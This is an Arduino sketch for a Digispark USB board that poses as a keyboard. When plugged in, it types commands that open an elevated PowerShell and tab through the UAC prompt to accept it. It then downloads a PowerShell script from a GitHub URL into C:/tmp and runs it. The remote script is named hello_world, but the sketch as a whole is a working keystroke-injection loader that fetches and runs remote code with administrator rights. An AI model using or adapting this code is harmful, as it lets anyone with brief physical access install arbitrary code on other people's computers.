#include "DigiKeyboard.h"
#define KEY_TAB               0x2B     // Keyboard Tab

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);    
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print(F("powerShell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("start-process PowerShell -verb runas"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //the next two lines minimize the cmd window
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("Invoke-WebRequest https://github.com/pawelsupel/digispark/raw/main/scripts/hello_world/hello_world.ps1 -OutFile C:/tmp/hello_world.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("cd C:/tmp"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F(".\\hello_world.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(100000);
  exit(0);
}
